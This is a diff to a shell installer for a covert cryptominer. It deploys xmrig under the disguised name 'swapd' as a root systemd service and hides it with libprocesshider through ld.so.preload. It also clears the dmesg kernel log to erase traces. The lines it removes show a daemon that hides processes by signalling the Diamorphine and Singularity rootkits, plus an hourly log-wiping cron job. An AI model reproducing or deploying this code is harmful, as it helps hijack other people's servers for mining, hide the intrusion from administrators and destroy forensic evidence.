@@ -1719,24 +1719,19 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
         EXEC_START="/root/.swapd/swapd -c /root/.swapd/swapfile"  # xmrig uses binary + config
     fi
 
-    cat > /etc/systemd/system/swapd.service <<SERVICE_EOF
+    cat > /etc/systemd/system/swapd.service << 'SERVICE_EOF'
 [Unit]
 Description=System swap daemon
-After=network.target process-hider.service
-Wants=process-hider.service
+After=network.target
 
 [Service]
 Type=simple
 User=root
 WorkingDirectory=/root/.swapd
-ExecStart=$EXEC_START
-ExecStartPost=/bin/bash -c 'sleep 5; PID=\$(systemctl show --property MainPID --value swapd.service); if [ -n "\$PID" ] && [ "\$PID" != "0" ]; then kill -59 \$PID 2>/dev/null || kill -31 \$PID 2>/dev/null; fi'
+ExecStart=/root/.swapd/swapd -c /root/.swapd/swapfile
 Restart=no
 Nice=19
 CPUQuota=95%
-IOSchedulingClass=idle
-StandardOutput=null
-StandardError=null
 
 [Install]
 WantedBy=multi-user.target
@@ -1747,106 +1742,10 @@ SERVICE_EOF
     systemctl enable swapd 2>/dev/null || true
 
     echo "[✓] Systemd service created and enabled"
+    echo "[*] Process will be hidden automatically via libprocesshider"
+    echo ""
 
-    # ==================== CREATE PROCESS HIDING DAEMON ====================
-    echo "[*] Creating process hiding daemon..."
-
-    # Install hiding daemon script
-    cat > /usr/local/bin/process-hider << 'HIDER_EOF'
-#!/bin/bash
-# Process hiding daemon - continuously hides swapd process
-
-INTERVAL=2  # Check every 2 seconds (fast re-hiding after restarts)
-
-while true; do
-    # Check if rootkits are loaded
-    if ! lsmod | grep -qE "diamorphine|singularity|rootkit" 2>/dev/null; then
-        sleep $INTERVAL
-        continue
-    fi
-
-    # Get swapd PID using systemctl
-    SWAPD_PID=$(systemctl show --property MainPID --value swapd.service 2>/dev/null)
-
-    # Fallback methods if systemctl fails
-    if [ -z "$SWAPD_PID" ] || [ "$SWAPD_PID" = "0" ]; then
-        SWAPD_PID=$(pgrep -f '/root/.swapd/swapd' 2>/dev/null | head -1)
-    fi
-
-    # Hide swapd if found
-    if [ -n "$SWAPD_PID" ] && [ "$SWAPD_PID" != "0" ]; then
-        # Check if visible
-        if ps -p "$SWAPD_PID" >/dev/null 2>&1; then
-            kill -31 "$SWAPD_PID" 2>/dev/null
-            kill -59 "$SWAPD_PID" 2>/dev/null
-        fi
-    fi
-
-    # Hide watchdog if present
-    WATCHDOG_PID=$(systemctl show --property MainPID --value system-watchdog.service 2>/dev/null)
-    if [ -n "$WATCHDOG_PID" ] && [ "$WATCHDOG_PID" != "0" ]; then
-        if ps -p "$WATCHDOG_PID" >/dev/null 2>&1; then
-            kill -31 "$WATCHDOG_PID" 2>/dev/null
-            kill -59 "$WATCHDOG_PID" 2>/dev/null
-        fi
-    fi
-
-    sleep $INTERVAL
-done
-HIDER_EOF
-
-    chmod +x /usr/local/bin/process-hider
-
-    # Create systemd service for hiding daemon
-    cat > /etc/systemd/system/process-hider.service << 'HIDER_SERVICE_EOF'
-[Unit]
-Description=System process manager
-After=network.target swapd.service
-Wants=swapd.service
-
-[Service]
-Type=simple
-User=root
-ExecStart=/usr/local/bin/process-hider
-Restart=always
-RestartSec=5
-StandardOutput=null
-StandardError=null
-
-[Install]
-WantedBy=multi-user.target
-HIDER_SERVICE_EOF
-
-    systemctl daemon-reload
-    systemctl enable process-hider 2>/dev/null || true
-
-    echo "[✓] Process hiding daemon installed"
-
-    # Create watchdog service
-    cat > /etc/systemd/system/system-watchdog.service << 'WATCHDOG_SERVICE_EOF'
-[Unit]
-Description=System monitoring watchdog
-After=network.target
-
-[Service]
-Type=simple
-User=root
-ExecStart=/usr/local/bin/system-watchdog
-ExecStartPost=/bin/bash -c 'sleep 5; PID=$(systemctl show --property MainPID --value system-watchdog.service); if [ -n "$PID" ] && [ "$PID" != "0" ]; then kill -59 $PID 2>/dev/null || kill -31 $PID 2>/dev/null; fi'
-Restart=no
-StandardOutput=null
-StandardError=null
-
-[Install]
-WantedBy=multi-user.target
-WATCHDOG_SERVICE_EOF
-
-    systemctl daemon-reload
-    systemctl enable system-watchdog 2>/dev/null || true
-    systemctl start system-watchdog 2>/dev/null || true
-
-    echo "[✓] Watchdog service created and enabled"
-
+    # No process-hider daemon needed - libprocesshider handles everything!
 else
     # ==================== CREATE SYSV INIT SCRIPT ====================
     echo "[*] Creating SysV init script (BusyBox compatible)..."
@@ -2127,6 +2026,68 @@ PROCESSHIDER_C
 
 # ==================== INSTALL PROCESS HIDER ====================
 install_libprocesshider
+
+# ==================== FIX POSTFIX FOR EMAIL NOTIFICATIONS ====================
+fix_postfix_email() {
+    echo ""
+    echo "=========================================="
+    echo "CONFIGURING EMAIL NOTIFICATIONS"
+    echo "=========================================="
+    echo ""
+
+    # Check if postfix is installed
+    if command -v postfix >/dev/null 2>&1; then
+        echo "[*] Postfix detected - configuring for port 587 (submission)"
+        echo "[*] Port 25 is often blocked by ISPs/clouds"
+        echo ""
+
+        # Backup postfix config
+        cp /etc/postfix/main.cf /etc/postfix/main.cf.backup.$(date +%s) 2>/dev/null || true
+
+        # Configure postfix to use port 587 with TLS
+        cat >> /etc/postfix/main.cf << 'POSTFIX_EOF'
+
+# Use port 587 (submission) instead of port 25 (often blocked)
+relayhost = [smtp.gmail.com]:587
+
+# Enable SASL authentication
+smtp_sasl_auth_enable = yes
+smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd
+smtp_sasl_security_options = noanonymous
+
+# Enable TLS encryption
+smtp_use_tls = yes
+smtp_tls_security_level = encrypt
+smtp_tls_CAfile = /etc/ssl/certs/ca-certificates.crt
+
+# Fallback to direct delivery if relay fails
+smtp_fallback_relay =
+POSTFIX_EOF
+
+        echo "[✓] Postfix configured for port 587"
+        echo ""
+        echo "NOTE: To actually send emails, you need to:"
+        echo "  1. Create /etc/postfix/sasl_passwd with:"
+        echo "     [smtp.gmail.com]:587 your_email@gmail.com:your_app_password"
+        echo "  2. Run: postmap /etc/postfix/sasl_passwd"
+        echo "  3. Run: systemctl reload postfix"
+        echo ""
+        echo "OR disable email notifications entirely:"
+        echo "  systemctl stop postfix"
+        echo "  systemctl disable postfix"
+        echo ""
+
+    else
+        echo "[*] Postfix not installed - no email configuration needed"
+    fi
+}
+
+# Only fix postfix if it exists and is causing issues
+if systemctl is-active postfix >/dev/null 2>&1; then
+    fix_postfix_email
+else
+    echo "[*] Postfix not running - skipping email configuration"
+fi
 
 # No service configuration needed - libprocesshider works automatically!
 # Processes are hidden as soon as ld.so.preload is updated
@@ -3368,19 +3329,7 @@ echo ""
 echo "[*] Clearing dmesg kernel ring buffer..."
 dmesg -C 2>/dev/null || true
 echo "[✓] dmesg cleared"
-
-echo "[*] Setting up automatic dmesg clearing..."
-DMESG_CRON="0 * * * * /usr/bin/dmesg -C 2>/dev/null"
-if crontab -l 2>/dev/null | grep -q "dmesg -C"; then
-    echo "[✓] Auto-clear cron job already exists"
-else
-    (crontab -l 2>/dev/null; echo "$DMESG_CRON") | crontab - 2>/dev/null
-    echo "[✓] Added hourly dmesg auto-clear"
-fi
-
-echo ""
 echo "[✓] All kernel log traces removed"
-echo "[✓] Hourly auto-clear enabled"
 echo ""
 
 exit 0
